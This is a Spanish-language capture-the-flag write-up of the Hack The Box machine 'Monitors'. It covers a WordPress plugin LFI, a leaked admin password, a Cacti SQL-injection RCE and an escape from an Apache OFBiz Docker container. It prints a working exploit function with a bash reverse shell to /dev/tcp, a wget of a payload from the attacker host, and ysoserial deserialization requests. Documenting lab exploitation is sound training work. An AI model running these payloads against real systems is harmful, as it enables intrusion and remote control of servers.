---
layout: single
title: Monitors - Hack The Box
excerpt: "Hoy nos enfrentamos contra la máquina monitors que tiene una dificultad difícil. La máquina es bastante pesada, contempla una vulnerabilidad de un plugin de wordpress que nos permite leer archivos de la máquina. Luego hacemos una inyección sql para conseguir conectarnos a la máquina, después accedemos a un sandbox, escapamos de él y conseguimos root en la máquina oficial."
date: 2022-09-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-monitors/monitors_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - rce
  - sandbox escape 
  - lfi
  - cms exploit
---

![](/assets/images/htb-writeup-monitors/monitors_logo.png)

Monitors comienza con un WordPress que es vulnerable a un plugin local que incluye una vulnerabilidad que me permite leer archivos del sistema. Al hacerlo, descubrimos otro dominio que sirva una versión vulnerable de Cacti, que explotaremos mediante inyección SQL que conduce a la ejecución del código. A partir de ahí, identificamos un nuevo servicio en desarrollo que ejecute Apache ofbiz en un contenedor Docker y lo usamos para ingresar al contenedor. El contenedor se ejecuta con privilegios, de lo que abusaremos al instalar un módulo de kernel malicioso para obtener acceso como root en el host.

## Enumeración

```ruby
 nmap -sCV -p22,80 10.10.10.238 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-16 11:08 -03
Nmap scan report for 10.10.10.238
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.94 seconds
```
Empezamos enumerando el servicio 80 con whatweb y extraemos dominios.

![](/assets/images/htb-writeup-monitors/whatweb.png)

Vemos que en la ruta /wp-content/plugin tiene directory listing.Por lo cual buscamos si el plugin que vemos es vulnerable.

![](/assets/images/htb-writeup-monitors/plugin.png)
![](/assets/images/htb-writeup-monitors/searchsploit.png)

Comprobamos si es vulnerable a un lfi.

![](/assets/images/htb-writeup-monitors/etc-passwd.png)

Gracias al lfi sacamos una contraseña del archivo configuracion wp-config y extraemos un dominio de 000-default.conf.En el nuevo dominio vemos un panel login.
```bash
wpadmin:BestAdministrator@2020!
```
![](/assets/images/htb-writeup-monitors/login.png)

En el panel de login probamos, como user admin y como password BestAdministrator@2020!.Luego buscamos cacti y la version y vemos que hay un exploit.Lo ejecutamos y contenemos una rce.

![](/assets/images/htb-writeup-monitors/exploitt.png)

## Elevacion de privilegios

En los procesos del sistema vemos lo siguiente.


```bash
/usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443
```
Hacemos un port forwarding para extraernos el puerto 8443 de la máquina 172.17.0.2 a mí máquina local. Identificamos que es un servidor https, y le lanzamos un fuzzing.

```bash

>ffuf -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://localhost:8443/FUZZ  -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://localhost:8443/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 242ms]
content                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 255ms]
common                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 249ms]
catalog                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 259ms]
marketing               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 257ms]
ecommerce               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 264ms]
ap                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 255ms]
ar                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 245ms]
ebay                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 247ms]
manufacturing           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 246ms]
passport                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 248ms]
example                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 260ms]
bi                      
```

Fuzeamos y en la ruta https://localhost:8443/manufacturing/control/main, tenemos un panel de login.

![](/assets/images/htb-writeup-monitors/login-docker.png)

En la derecha parte inferior vemos el servicio y version.

![](/assets/images/htb-writeup-monitors/version.png)


Encontramos un exploit, pero no es funcional, así que toca ejecutar todo manualmente.La parte del exploit que nos interesa es esta.

```bash
function webRequest(){
    echo -e "\n[*] Creating a shell file with bash\n"
    echo -e "#!/bin/bash\n/bin/bash -i >& /dev/tcp/$ip/$ncport 0>&1" > shell.sh
    echo -e "[*] Downloading YsoSerial JAR File\n"
    wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar
    echo -e "[*] Generating a JAR payload\n"
    payload=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget $ip/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n")
    echo -e "[*] Sending malicious shell to server...\n" && sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
    echo -e "[*] Generating a second JAR payload"
    payload2=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n")
    echo -e "\n[*] Executing the payload in the server...\n" && sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload2</serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
    echo -e "\n[*]Deleting Files..."
    rm ysoserial-master-d367e379d9-1.jar && rm shell.sh
}
```

![](/assets/images/htb-writeup-monitors/rce-docker.png)

Ahora lo hacemos pero para ganarnos una shell.

![](/assets/images/htb-writeup-monitors/root-docker.png)

## Elevacion de privilegios

El docker tiene una capability vulnerable en lo cual nos permite escapar del docker.Hacemos los pasos que nos indica el blog de hacktricks.Vemos que es vulnerable y luego ejecutamos una webshell.
```bash
#https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module
root@857ded81d423:/usr/src/apache-ofbiz-17.12.01# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
```
![](/assets/images/htb-writeup-monitors/root-oficial.png)
